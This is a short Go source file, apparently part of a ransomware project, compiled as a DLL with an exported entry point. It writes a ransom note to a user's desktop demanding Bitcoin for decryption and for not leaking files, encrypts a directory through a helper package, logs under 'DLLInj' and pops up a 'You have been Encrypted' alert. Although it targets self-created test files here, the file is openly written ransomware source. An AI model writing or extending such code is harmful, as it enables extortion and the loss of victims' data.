package main

import (
	"C"
)
import (
	"RRA/EncryptDecryptDirRecursive/encrypt"
	"helpers"
	"os"

	"github.com/tawesoft/golib/v2/dialog"
)

//export Entry
func Entry() {
	main()
}

func main() {
	var textForTxt = "YOUR FILES HAVE BEEN ENCRYPTED\n\nTo encrypt your files you have pay ransom.\nThe ransom must be paid in Bitcoin!\nThe amount of ransom that has to be baid in order to decrypt your files is 0.005 Bitcoin.\nThe amount of ransom that has to be baid in order to not spread your files is 0.01 Bitcoin.\nYou can send them to 1aChInoBitWallet123321"
	f, _ := os.Create("C:\\Users\\achon\\onedrive\\desktop\\RansomNote.txt")
	f.WriteString(textForTxt)
	nameOfLogFile := helpers.CreateLogFileIfItDoesNotExist("./", "DLLInj")
	nameOfEncryptionInfoFIle := helpers.CreateLogFileIfItDoesNotExist("./", "EncrInfo")
	helpers.CreateTestFiles("./", nameOfLogFile)
	encrypt.EncryptDir("./testfiles", nameOfLogFile, nameOfEncryptionInfoFIle)
	dialog.Alert("You have been Encrypted")
}
